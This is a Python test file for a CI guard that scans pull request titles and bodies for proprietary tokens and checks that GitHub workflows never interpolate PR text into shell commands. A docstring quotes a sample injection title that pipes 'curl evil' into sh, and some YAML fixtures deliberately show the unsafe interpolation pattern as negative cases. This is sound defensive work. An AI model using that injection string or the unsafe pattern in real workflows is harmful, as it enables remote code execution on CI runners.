"""Guards on ci/check_pr_text.py — the neutrality scan for a PR's title and body.

WHY THIS EXISTS
===============
The tree gate (`ci/check_no_proprietary_refs.py`) scans two things: tracked file
contents, and commit messages in the pushed range. A pull request's **title and
body** are neither. They live only in GitHub's database, they are editable after
the PR is opened, and they are among the most public prose this project
produces — a PR page is indexed and readable by anyone, exactly like the code.

Nothing scanned them. That is not a hypothetical gap: PR text is written by hand,
by whoever opens the PR, at the moment they are thinking hardest about the
downstream consumer's requirements and least about this repository's neutrality
rule.

WHAT THIS GUARD PINS
====================
1. the detector discriminates (a clean text passes, a text carrying a token
   fails) — asserted first, so a broken detector can never certify anything;
2. the secret-availability policy, case by case;
3. the workflow wiring — a checker no workflow runs is inert;
4. that PR text is never interpolated into a shell command, **by either
   route** — the direct ``${{ github.event.pull_request.title }}`` and the
   env-indirect ``${{ env.PR_TITLE }}``, which is the same substitution
   performed on a value that was forwarded correctly and then thrown away. The
   dangerous env names are DERIVED from each workflow's own ``env:`` blocks
   rather than denylisted, because a two-name denylist is defeated by calling
   the variable something else. Measured 2026-08-26: no workflow here takes the
   env route today, so this widening is a preventive control, not a fix.

The workflow scope comes from ``git ls-files``, both ``.yml`` and ``.yaml``, and
fails closed outside a checkout — see ``_workflow_paths``.

Loaded by path via importlib, never ``from ci import ...``: ``ci/`` has no
``__init__.py`` by design and CI runs the bare ``pytest ci/tests/ -q`` console
script, which does not put the CWD on sys.path (see CLAUDE.md).
"""

from __future__ import annotations

import importlib.util
import re
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
_CHECKER_PATH = _REPO_ROOT / "ci" / "check_pr_text.py"
_WORKFLOWS_DIR = _REPO_ROOT / ".github" / "workflows"

# Obviously fake, and the only kind of token that may appear in this public
# repo's tracked source — the real ones arrive at runtime from a secret.
_SYNTHETIC_TOKEN = "zzznotarealbrand"
_OTHER_SYNTHETIC_TOKEN = "zzzalsonotreal"

# The legacy base pattern's target word, assembled from parts so this test file
# does not itself trip the gate that scans it. Same convention as the sibling
# guard in ci/tests/test_check_no_proprietary_refs.py.
_LEGACY_WORD = "".join(["a", "s", "t", "r", "o"])

_THIS_REPO = "owner/open-vedic-calc"
_A_FORK = "someone-else/open-vedic-calc"


def _load_checker():
    spec = importlib.util.spec_from_file_location("check_pr_text", _CHECKER_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _env(**overrides) -> dict[str, str]:
    """A same-repo, human-actor environment with the secret present."""
    base = {
        "PR_TITLE": "fix(ci): something entirely neutral",
        "PR_BODY": "This changes the caller-facing contract for the HTTP client.",
        "PR_HEAD_REPO": _THIS_REPO,
        "GITHUB_REPOSITORY": _THIS_REPO,
        "GITHUB_ACTOR": "a-human",
        "PROPRIETARY_REF_TOKENS": _SYNTHETIC_TOKEN,
    }
    base.update({k: v for k, v in overrides.items() if v is not None})
    for key, value in overrides.items():
        if value is None:
            base.pop(key, None)
    return base


# ---------------------------------------------------------------------------
# 1. The detector discriminates -- asserted before anything else is trusted.
# ---------------------------------------------------------------------------
def test_the_detector_discriminates() -> None:
    """A guard whose detection is broken must never certify PR text as clean.

    This is the same fail-closed ordering the workflow-token guard uses, and for
    the same reason: an earlier line-scanning version of a sibling guard printed
    a pass at exit 0 with a real regression sitting in the tree.
    """
    checker = _load_checker()
    assert checker.main(_env()) == 0, "neutral PR text was refused"
    assert checker.main(_env(PR_BODY=f"see {_SYNTHETIC_TOKEN} for context")) == 1, (
        "a brand token in the BODY was not detected"
    )
    assert checker.main(_env(PR_TITLE=f"feat: wire up {_SYNTHETIC_TOKEN}")) == 1, (
        "a brand token in the TITLE was not detected"
    )


def test_both_fields_are_scanned_not_just_one() -> None:
    """Title and body are separate fields; scanning one is scanning half."""
    checker = _load_checker()
    scanned = checker.scanned_fields(_env())
    assert {"title", "body"} <= set(scanned), (
        f"the checker does not scan both fields: {sorted(scanned)}"
    )


def test_every_supplied_token_is_active_not_only_the_first() -> None:
    """A comma-separated list must compile to a pattern per token."""
    checker = _load_checker()
    both = f"{_SYNTHETIC_TOKEN},{_OTHER_SYNTHETIC_TOKEN}"
    assert checker.main(
        _env(PROPRIETARY_REF_TOKENS=both, PR_BODY=f"about {_OTHER_SYNTHETIC_TOKEN}")
    ) == 1, "only the first token in the list was active"


def test_the_match_is_case_insensitive() -> None:
    checker = _load_checker()
    assert checker.main(_env(PR_BODY=f"About {_SYNTHETIC_TOKEN.upper()} here")) == 1


# ---------------------------------------------------------------------------
# 2. Secret availability -- the fail-closed scoping decision, case by case.
# ---------------------------------------------------------------------------
def test_the_secret_expectation_is_decided_per_case() -> None:
    """Enumerated, because "same repo" is NOT the same question as "has secrets".

    GitHub withholds repository Actions secrets from two kinds of
    ``pull_request`` run: those from a fork, and those raised by Dependabot
    (which are served from a separate Dependabot secret store). The second is
    the one a naive same-repo test gets wrong — a Dependabot branch lives IN
    this repository, so ``head.repo == repository`` is true for it, and a
    hard-fail keyed on that alone would redden every weekly dependency bump.
    """
    checker = _load_checker()
    expected = checker.tokens_expected

    assert expected(_THIS_REPO, _THIS_REPO, "a-human") is True
    assert expected(_A_FORK, _THIS_REPO, "a-human") is False, "a fork PR has no secrets"
    assert expected(_THIS_REPO, _THIS_REPO, "dependabot[bot]") is False, (
        "a Dependabot run is served from the Dependabot secret store, so the "
        "repository secret is absent through no fault of the PR"
    )
    # An unknown head repo is treated as a fork: unprovable means not expected.
    assert expected("", _THIS_REPO, "a-human") is False


def test_a_missing_secret_where_it_should_exist_is_a_HARD_FAILURE() -> None:
    """The control must never silently run at reduced strength.

    This is the fail-closed half. On a same-repo PR the secret is available, so
    an empty value means it was never provisioned or has been cleared — and a
    scan that then checks only the legacy pattern would report a clean verdict
    about brand tokens it never had.
    """
    checker = _load_checker()
    rc = checker.main(_env(PROPRIETARY_REF_TOKENS=""))
    assert rc == 2, f"an absent-but-expected secret returned {rc}, not the refusal"
    rc_unset = checker.main(_env(PROPRIETARY_REF_TOKENS=None))
    assert rc_unset == 2, "an unset secret was not refused either"


@pytest.mark.parametrize(
    "overrides",
    [
        {"PR_HEAD_REPO": _A_FORK},
        {"GITHUB_ACTOR": "dependabot[bot]"},
    ],
    ids=["fork", "dependabot"],
)
def test_where_github_withholds_the_secret_the_scan_is_advisory(overrides) -> None:
    """The fail-safe half: never redden a PR for a secret its author cannot supply."""
    checker = _load_checker()
    rc = checker.main(_env(PROPRIETARY_REF_TOKENS="", **overrides))
    assert rc == 0, (
        f"a run GitHub withholds the secret from was refused (rc={rc}) — this "
        "would redden every fork PR and every dependency bump for a reason the "
        "author cannot fix"
    )


@pytest.mark.parametrize(
    "overrides",
    [
        {"PR_HEAD_REPO": _A_FORK},
        {"GITHUB_ACTOR": "dependabot[bot]"},
    ],
    ids=["fork", "dependabot"],
)
def test_advisory_does_not_mean_permissive_about_an_actual_hit(overrides) -> None:
    """A hit is a hit. Advisory scopes the MISSING SECRET, never the verdict.

    The legacy pattern needs no secret, so it is live on every run — including
    the ones that cannot see brand tokens. Letting a match slide because the
    scan was 'only advisory' would make the advisory mode a bypass.
    """
    checker = _load_checker()
    rc = checker.main(
        _env(
            PROPRIETARY_REF_TOKENS=_SYNTHETIC_TOKEN,
            PR_BODY=f"mentions {_SYNTHETIC_TOKEN}",
            **overrides,
        )
    )
    assert rc == 1, f"a token hit on an advisory run returned {rc}, not a failure"


@pytest.mark.parametrize(
    "overrides",
    [
        {"PR_HEAD_REPO": _A_FORK},
        {"GITHUB_ACTOR": "dependabot[bot]"},
    ],
    ids=["fork", "dependabot"],
)
def test_a_legacy_hit_fails_even_with_NO_secret_at_all(overrides) -> None:
    """The realistic advisory shape: withheld secret AND zero brand tokens.

    Its sibling above supplies tokens, which is not what a fork run actually
    looks like — GitHub gives it none. So that test leaves the important path
    unexercised, and a neuter measured it: gating the violation report on
    ``token_count`` (``if violations and token_count:``) left the whole suite
    GREEN while a legacy match on a fork PR was silently tolerated. That is the
    advisory mode becoming a bypass, which is the one thing it must never be.

    The legacy pattern needs no secret, so it is live on every run, and a match
    on it must fail the job whatever the secret situation is.
    """
    checker = _load_checker()
    rc = checker.main(
        _env(
            PROPRIETARY_REF_TOKENS="",
            PR_BODY=f"this mentions {_LEGACY_WORD} directly",
            **overrides,
        )
    )
    assert rc == 1, (
        f"a legacy-pattern hit on a secret-less advisory run returned {rc}. "
        "Advisory scopes the missing secret, never the verdict — tolerating a "
        "match here turns the degraded mode into a way around the gate."
    )


def test_the_legacy_pattern_is_live_when_no_secret_is_supplied() -> None:
    """The premise of the test above: check the pattern set, not just a verdict.

    If the legacy pattern were ever dropped from the no-secret path, the test
    above would still pass for the wrong reason on some other match.
    """
    checker = _load_checker()
    patterns, token_count = checker._patterns(_env(PROPRIETARY_REF_TOKENS=""))
    assert token_count == 0
    assert len(patterns) >= 1, "no patterns at all are active without the secret"
    assert any(p.search(f"a {_LEGACY_WORD} reference") for p in patterns), (
        "the legacy pattern is not active on a run without the secret"
    )


def test_the_advisory_says_exactly_what_it_could_not_check(capsys) -> None:
    """An advisory nobody can act on is decoration.

    It must name the gap — brand tokens unchecked, legacy pattern still live —
    so a reader knows what was and was not verified.
    """
    checker = _load_checker()
    checker.main(_env(PROPRIETARY_REF_TOKENS="", PR_HEAD_REPO=_A_FORK))
    combined = (capsys.readouterr().out + capsys.readouterr().err).upper()
    assert "ADVISORY" in combined, "the reduced-strength run did not announce itself"


def test_the_refusal_names_the_secret(capsys) -> None:
    """A refusal must be actionable: name the secret that has to be provisioned."""
    checker = _load_checker()
    checker.main(_env(PROPRIETARY_REF_TOKENS=""))
    captured = capsys.readouterr()
    assert "PROPRIETARY_REF_TOKENS" in (captured.out + captured.err)


# ---------------------------------------------------------------------------
# 3. Wiring -- a checker no workflow runs is inert.
# ---------------------------------------------------------------------------
_WORKFLOW_SUFFIXES = frozenset({".yml", ".yaml"})


def _workflow_paths(repo_root: Path) -> list[Path]:
    """Every workflow file, asked of git -- BOTH extensions, tracked and staged-to-be.

    Three decisions, each of them a lesson paid for elsewhere in this workspace:

    * **Both suffixes.** GitHub Actions runs ``.yaml`` exactly as it runs
      ``.yml``. A ``*.yml`` glob makes an affirmative "no violations" claim about
      a file it never opened -- and this is the third repository here to be
      bitten by that particular half-enumeration.
    * **git, not a directory glob.** ``--exclude-standard`` drops a developer's
      ignored scratch workflow, so the verdict does not depend on what else is
      on the disk; ``--others`` keeps an UNTRACKED workflow in scope, which is
      this guard's own stated reason for existing -- the cheapest moment to
      catch a violation is the commit that introduces it, and at that moment the
      file is not yet tracked. Tracked-only would arrive one commit late, so the
      union is the choice, matching ``ci/check_pytest_collection.py``.
    * **``-z``, and bytes mode.** Without ``-z`` git QUOTES a path holding
      non-ASCII bytes and octal-escapes them; a text-mode read moves the decode
      onto a thread where its failure is invisible.

    Fails CLOSED: outside a checkout this raises rather than returning an empty
    list, because "zero workflows found" and "zero violations found" are the
    same green and a guard may not reach the second by way of the first.
    """
    result = subprocess.run(
        [
            "git", "ls-files", "-z", "--cached", "--others", "--exclude-standard",
            "--", ".github/workflows",
        ],
        cwd=repo_root,
        capture_output=True,
        check=False,
    )
    assert result.returncode == 0, (
        f"`git ls-files` failed in {repo_root}: "
        f"{result.stderr.decode('utf-8', 'replace').strip()}. This guard derives "
        "its scope from git and fails closed rather than reporting no workflows."
    )
    records = [r for r in result.stdout.decode("utf-8").split("\0") if r]
    return sorted(
        {
            repo_root / record
            for record in records
            if Path(record).suffix in _WORKFLOW_SUFFIXES
        }
    )


def _workflows() -> dict[Path, dict]:
    loaded = {}
    for path in _workflow_paths(_REPO_ROOT):
        loaded[path] = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    return loaded


# The two expressions that put attacker-controlled PR text straight into a shell.
_PR_TEXT_EXPRESSIONS = (
    "github.event.pull_request.title",
    "github.event.pull_request.body",
)

# This repository's convention names the forwarded values PR_TITLE / PR_BODY.
# Kept as a floor under the DERIVED set below rather than as the whole rule: a
# step that deleted its `env:` block while leaving `${{ env.PR_TITLE }}` in the
# run body would otherwise derive nothing and pass.
_PR_TEXT_ENV_KEYS = frozenset({"PR_TITLE", "PR_BODY"})

# One GitHub expression. They do not nest, so this is lexical -- not a model of
# anything. That distinction matters: the sibling PYTEST_ADDOPTS guard is blunt
# because telling a harmless mention from a poisoning one there meant modelling
# redirection, heredocs and indirection. Here the substitution GitHub performs
# IS `${{ ... }}` and nothing else, so reading exactly that is precision, not a
# guess.
_EXPRESSION = re.compile(r"\$\{\{(?P<body>.*?)\}\}", re.S)


def _env_keys_carrying_pr_text(document: dict) -> set[str]:
    """Every ``env:`` key, at any level, whose VALUE carries PR text.

    Derived from the workflow rather than hardcoded, because a two-name denylist
    is defeated by calling the variable something else: ``SUBJECT: ${{
    github.event.pull_request.body }}`` followed by ``${{ env.SUBJECT }}`` is the
    identical injection under a different label.
    """
    found: set[str] = set()

    def _harvest(env) -> None:
        if not isinstance(env, dict):
            return
        for key, value in env.items():
            text = "" if value is None else str(value)
            if any(expression in text for expression in _PR_TEXT_EXPRESSIONS):
                found.add(str(key))

    _harvest(document.get("env"))
    for job in (document.get("jobs") or {}).values():
        if not isinstance(job, dict):
            continue
        _harvest(job.get("env"))
        for step in job.get("steps", []) or []:
            if isinstance(step, dict):
                _harvest(step.get("env"))
    return found


def _interpolation_offenders(document: dict, label: str = "<document>") -> list[str]:
    """Every ``run:`` body that lets PR text reach the shell as CODE.

    Two routes, one mechanism. The direct route interpolates
    ``${{ github.event.pull_request.title }}``; the env route forwards the value
    into ``env:`` -- which is the CORRECT thing to do -- and then throws it away
    by writing ``${{ env.PR_TITLE }}`` in the run body. ``env:`` is only safe
    while the script reads a SHELL variable (``"$PR_TITLE"``): the shell expands
    that itself, over data it already holds. A ``${{ }}`` expression is textual
    substitution performed BEFORE the shell parses the command, and it does not
    care which route the text arrived by.
    """
    dangerous_env = _PR_TEXT_ENV_KEYS | _env_keys_carrying_pr_text(document)
    offenders: list[str] = []
    for job_name, job in (document.get("jobs") or {}).items():
        if not isinstance(job, dict):
            continue
        for step in job.get("steps", []) or []:
            if not isinstance(step, dict):
                continue
            run = step.get("run") or ""
            for expression in _PR_TEXT_EXPRESSIONS:
                if expression in run:
                    offenders.append(
                        f"{label}:{job_name}: {expression} in a run: body"
                    )
            for match in _EXPRESSION.finditer(run):
                body = match.group("body")
                for key in sorted(dangerous_env):
                    if re.search(rf"(?<![\w.]) *env\.{re.escape(key)}\b", body):
                        offenders.append(
                            f"{label}:{job_name}: ${{{{ env.{key} }}}} in a run: "
                            f"body -- the value is substituted into the script "
                            f"before the shell parses it. Read it as a shell "
                            f'variable instead: "${key}".'
                        )
    return offenders


def _steps_running_the_checker(self_test: bool | None = None) -> list[tuple[Path, dict, dict]]:
    """(workflow path, workflow document, step) for every step invoking it.

    ``self_test`` selects between the two kinds of step this checker gets: the
    ``--self-test`` invocation, which deliberately carries no ``env:`` because
    it builds its own fixtures, and the real scan, which must carry all of it.
    Conflating them makes an assertion about one fire on the other.
    """
    found = []
    for path, document in _workflows().items():
        for job in (document.get("jobs") or {}).values():
            for step in job.get("steps", []) or []:
                run = step.get("run") or ""
                if "check_pr_text.py" not in run:
                    continue
                is_self_test = "--self-test" in run
                if self_test is None or is_self_test == self_test:
                    found.append((path, document, step))
    return found


def test_a_workflow_step_actually_runs_the_pr_text_check() -> None:
    assert _steps_running_the_checker(self_test=False), (
        "no workflow step invokes ci/check_pr_text.py — the checker exists but "
        "never runs, so PR text is still unscanned"
    )


def test_the_self_test_runs_BEFORE_the_scan_in_the_same_job() -> None:
    """A detector that stopped matching must stop the job, not certify it green.

    Ordering is the whole point: running the self-test after the scan would let
    a broken detector report a clean PR first. This is the fail-closed ordering
    the sibling checkers use.
    """
    self_tests = _steps_running_the_checker(self_test=True)
    assert self_tests, "no workflow step runs `ci/check_pr_text.py --self-test`"

    for path, document, _step in self_tests:
        for job_name, job in (document.get("jobs") or {}).items():
            steps = job.get("steps", []) or []
            runs = [s.get("run") or "" for s in steps]
            indices = [i for i, r in enumerate(runs) if "check_pr_text.py" in r]
            if not indices:
                continue
            first_self_test = next(
                (i for i in indices if "--self-test" in runs[i]), None
            )
            first_scan = next(
                (i for i in indices if "--self-test" not in runs[i]), None
            )
            assert first_self_test is not None, (
                f"{path.name}:{job_name} scans PR text without ever proving the "
                "detector discriminates"
            )
            assert first_scan is not None and first_self_test < first_scan, (
                f"{path.name}:{job_name} runs the scan at step {first_scan} "
                f"before the self-test at {first_self_test}"
            )


def test_the_job_runs_on_pull_request_including_EDITED() -> None:
    """A body edited after opening must be re-scanned.

    ``on: pull_request`` defaults to ``opened, synchronize, reopened`` — NOT
    ``edited``. Without it, the scan can be defeated by opening a clean PR and
    then editing the leak in, and the check would still show its original green.
    """
    for path, document, _step in _steps_running_the_checker(self_test=False):
        triggers = document.get("on") or document.get(True) or {}
        assert isinstance(triggers, dict) and "pull_request" in triggers, (
            f"{path.name} runs the PR-text check but is not triggered by "
            f"pull_request: {triggers!r}"
        )
        config = triggers.get("pull_request") or {}
        types = (config or {}).get("types")
        assert types is not None, (
            f"{path.name} does not restrict pull_request types, so it takes the "
            "default set, which omits 'edited' — a body edited after opening "
            "would never be re-scanned"
        )
        assert "edited" in types, f"{path.name} pull_request types omit 'edited': {types}"


def test_the_step_receives_every_input_the_checker_reads() -> None:
    """A forwarded fact the workflow forgets is a policy decision made by accident."""
    required = {
        "PR_TITLE",
        "PR_BODY",
        "PR_HEAD_REPO",
        "GITHUB_ACTOR",
        "PROPRIETARY_REF_TOKENS",
    }
    for path, _document, step in _steps_running_the_checker(self_test=False):
        supplied = set((step.get("env") or {}).keys())
        missing = required - supplied
        assert not missing, (
            f"{path.name}'s PR-text step does not pass {sorted(missing)} — the "
            "checker would read an empty value and decide policy on it"
        )


def test_the_secret_is_passed_from_the_secrets_context() -> None:
    """Passing a literal instead of the secret would put the brand in the tree."""
    for path, _document, step in _steps_running_the_checker(self_test=False):
        value = str((step.get("env") or {}).get("PROPRIETARY_REF_TOKENS", ""))
        assert "secrets.PROPRIETARY_REF_TOKENS" in value, (
            f"{path.name} does not source the token list from the secrets "
            f"context: {value!r}. The token must never be a literal here."
        )


# ---------------------------------------------------------------------------
# 4. PR text is attacker-controlled -- it may never reach a shell as code.
# ---------------------------------------------------------------------------
def test_pr_text_is_never_interpolated_into_a_run_body() -> None:
    """``${{ }}`` is textual substitution performed BEFORE the shell runs.

    A PR title of ``a"; curl evil | sh; "`` interpolated into a ``run:`` body
    executes. Anyone can open a pull request against a public repository, so the
    title and body are attacker-controlled input. They must reach the process
    through ``env:``, which hands them over as data.

    This is asserted across EVERY workflow, not only the one added here — the
    property is about the repository, and the cheapest moment to catch a new
    violation is the commit that introduces it.
    """
    offenders = [
        offender
        for path, document in _workflows().items()
        for offender in _interpolation_offenders(document, path.name)
    ]
    assert not offenders, (
        "PR text is interpolated directly into a shell command:\n  "
        + "\n  ".join(offenders)
        + "\nPass it through `env:` instead — `${{ }}` substitutes text before "
        "the shell parses it, so a title carrying shell metacharacters would "
        "execute."
    )


def test_the_guard_above_examined_something() -> None:
    """"No offenders" is vacuously true of a scan that found no workflows."""
    documents = _workflows()
    assert len(documents) >= 3, f"only {len(documents)} workflows enumerated"
    steps = sum(
        len(job.get("steps", []) or [])
        for document in documents.values()
        for job in (document.get("jobs") or {}).values()
    )
    assert steps >= 20, f"only {steps} workflow steps enumerated"


# ---------------------------------------------------------------------------
# 4b. The env-indirect spelling of the same injection.
# ---------------------------------------------------------------------------
_SAFE_RUN = """\
name: probe
on: [push]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: python ci/check_pr_text.py
"""

_ENV_INTERPOLATED_RUN = """\
name: probe
on: [push]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "${{ env.PR_TITLE }}" > title.txt
"""

_RENAMED_ENV_INTERPOLATED_RUN = """\
name: probe
on: [push]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - env:
          SUBJECT: ${{ github.event.pull_request.body }}
        run: echo "${{ env.SUBJECT }}"
"""


def test_the_env_route_is_flagged_too_not_just_the_direct_expression() -> None:
    """``env:`` is only safe while the run body reads a SHELL variable.

    Putting the title in ``env:`` and then writing ``${{ env.PR_TITLE }}`` in the
    ``run:`` body re-opens the identical hole: a ``${{ }}`` expression is
    textual substitution performed BEFORE the shell parses the command, and it
    does not care which route the text arrived by. So the safe spelling is
    ``"$PR_TITLE"`` -- a shell variable expansion, which the shell performs on
    data it already holds -- and the denylist has to cover both.

    This is a hole the guard did not see: it denylisted exactly the two direct
    ``github.event.pull_request.*`` expressions, and a workflow author who "did
    it right" by moving the value into ``env:`` could reintroduce the injection
    in the same breath.
    """
    checker_offenders = _interpolation_offenders(yaml.safe_load(_ENV_INTERPOLATED_RUN))
    assert checker_offenders, (
        "`${{ env.PR_TITLE }}` in a run: body was not flagged -- the value still "
        "reaches the shell as code, exactly as the direct expression does"
    )
    assert not _interpolation_offenders(yaml.safe_load(_SAFE_RUN)), (
        "the compliant shape -- env: carrying the value, run: not interpolating "
        "it -- was flagged, which would make the guard unusable"
    )


def test_the_dangerous_env_names_are_derived_from_the_workflow_not_hardcoded() -> None:
    """A denylist of two names is defeated by naming the variable something else.

    ``SUBJECT: ${{ github.event.pull_request.body }}`` then
    ``${{ env.SUBJECT }}`` is the same injection under a different label. The
    dangerous names are therefore READ from the workflow's own ``env:`` blocks --
    any key whose value carries PR text -- unioned with the two names this
    repository's convention uses, so neither a rename nor a deleted ``env:``
    block can hide it.
    """
    offenders = _interpolation_offenders(yaml.safe_load(_RENAMED_ENV_INTERPOLATED_RUN))
    assert offenders, (
        "an env key carrying PR text under a different NAME was interpolated "
        "into a run: body and went unflagged -- the guard is a two-name "
        "denylist, not a check on the mechanism"
    )


_ORPHAN_ENV_INTERPOLATED_RUN = """\
name: probe
on: [push]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ env.PR_BODY }}"
"""


def test_the_convention_floor_catches_what_derivation_cannot_see() -> None:
    """Derivation alone fails open when the ``env:`` block is gone.

    A step that deletes its ``env:`` mapping but leaves ``${{ env.PR_BODY }}`` in
    the run body derives NOTHING dangerous -- there is no assignment left to read
    the PR expression out of -- so a purely derived rule would pass it. That is
    not hypothetical bookkeeping: the value can be set at job or workflow level,
    or by a preceding step writing ``$GITHUB_ENV``, none of which this step's own
    ``env:`` records.

    Written because a neuter measured the gap: removing ``_PR_TEXT_ENV_KEYS``
    from the union left the whole module GREEN, because every other fixture here
    happens to declare the key it interpolates. A floor nothing exercises is a
    claim, not a control.
    """
    offenders = _interpolation_offenders(yaml.safe_load(_ORPHAN_ENV_INTERPOLATED_RUN))
    assert offenders, (
        "`${{ env.PR_BODY }}` in a run: body went unflagged because no env: "
        "block in that workflow declares it -- derivation cannot see a value "
        "that arrives from another level, so the convention names are a floor "
        "under it, not a redundancy"
    )


def test_nothing_in_this_repository_takes_the_env_route_today() -> None:
    """The premise, measured rather than assumed.

    This widening closes a hole that is currently EMPTY. Saying so is the point:
    a guard whose motivating defect is already present is a fix, and one whose
    motivating defect is not is a preventive control -- and conflating the two
    is how a "measured" claim gets written about something nobody measured.
    """
    offenders = [
        offender
        for path, document in _workflows().items()
        for offender in _interpolation_offenders(document, path.name)
    ]
    assert not offenders, (
        "PR text is interpolated into a run: body via env:\n  "
        + "\n  ".join(offenders)
    )


# ---------------------------------------------------------------------------
# 4c. The enumeration -- scope from git, both extensions.
# ---------------------------------------------------------------------------
def _fixture_repo(tmp_path: Path, files: dict[str, str], commit: bool = True) -> Path:
    root = tmp_path / "repo"
    root.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q"], cwd=root, check=True)
    subprocess.run(["git", "config", "user.email", "t@e.com"], cwd=root, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=root, check=True)
    for relative, content in files.items():
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8", newline="\n")
    if commit:
        subprocess.run(["git", "add", "-A"], cwd=root, check=True)
        subprocess.run(["git", "commit", "-qm", "fixture"], cwd=root, check=True)
    return root


def test_a_yaml_workflow_is_not_invisible_to_the_enumeration(tmp_path: Path) -> None:
    """``*.yml`` alone is the third repository in this workspace to be bitten.

    GitHub Actions runs ``.yaml`` exactly as it runs ``.yml``. A guard that
    globs one of them makes an affirmative "no violations" claim about a file it
    never opened, which is worse than not checking: the claim is what a reviewer
    reads.
    """
    root = _fixture_repo(
        tmp_path,
        {
            ".github/workflows/a.yml": _SAFE_RUN,
            ".github/workflows/b.yaml": _SAFE_RUN,
        },
    )
    names = {p.name for p in _workflow_paths(root)}
    assert names == {"a.yml", "b.yaml"}, (
        f"the enumeration returned {sorted(names)} -- a .yaml workflow is "
        "invisible to it, and GitHub runs it all the same"
    )


def test_an_untracked_workflow_is_enumerated(tmp_path: Path) -> None:
    """``--others``: the cheapest moment to catch a violation is before it lands.

    This guard's own stated reason for scanning EVERY workflow is that the
    cheapest moment to catch a new violation is the commit that introduces it --
    and at that moment the offending file is typically still untracked.
    Tracked-only enumeration would arrive one commit too late.
    """
    root = _fixture_repo(tmp_path, {".github/workflows/a.yml": _SAFE_RUN})
    (root / ".github/workflows/new.yml").write_text(
        _ENV_INTERPOLATED_RUN, encoding="utf-8", newline="\n"
    )
    names = {p.name for p in _workflow_paths(root)}
    assert "new.yml" in names, (
        f"an untracked workflow was not enumerated ({sorted(names)}) -- the "
        "violation would be caught only after it was committed"
    )


def test_a_git_ignored_workflow_file_is_not_enumerated(tmp_path: Path) -> None:
    """``--exclude-standard``: a local scratch file is not this repository's CI.

    Without it the guard's verdict depends on what else happens to be on the
    developer's disk, which is the same defect the tree gate's directory walk
    carried.
    """
    root = _fixture_repo(
        tmp_path,
        {
            ".github/workflows/a.yml": _SAFE_RUN,
            ".gitignore": ".github/workflows/scratch.yml\n",
        },
    )
    (root / ".github/workflows/scratch.yml").write_text(
        _ENV_INTERPOLATED_RUN, encoding="utf-8", newline="\n"
    )
    names = {p.name for p in _workflow_paths(root)}
    assert "scratch.yml" not in names, (
        f"a git-ignored scratch workflow was enumerated ({sorted(names)}); it is "
        "not part of this repository's CI and cannot inject anything"
    )


def test_the_enumeration_fails_closed_when_git_cannot_answer(tmp_path: Path) -> None:
    """Outside a checkout the guard refuses rather than reporting no workflows.

    "Zero workflows found" and "zero violations found" are the same green, and
    a guard may not reach the second by way of the first.
    """
    loose = tmp_path / "not-a-repo"
    (loose / ".github" / "workflows").mkdir(parents=True)
    (loose / ".github" / "workflows" / "a.yml").write_text(_SAFE_RUN, encoding="utf-8")
    with pytest.raises(AssertionError, match="ls-files"):
        _workflow_paths(loose)


def test_this_repositorys_workflows_come_from_git(tmp_path: Path) -> None:
    """Non-vacuity on the real tree, and the extension set it actually holds."""
    paths = _workflow_paths(_REPO_ROOT)
    assert len(paths) >= 3, f"only {len(paths)} workflows enumerated here"
    assert all(p.suffix in {".yml", ".yaml"} for p in paths), sorted(
        p.name for p in paths
    )


# ---------------------------------------------------------------------------
# 5. The checker's own self-test, as the sibling checkers carry.
# ---------------------------------------------------------------------------
def test_self_test_passes_and_discriminates() -> None:
    checker = _load_checker()
    assert checker.self_test() == 0
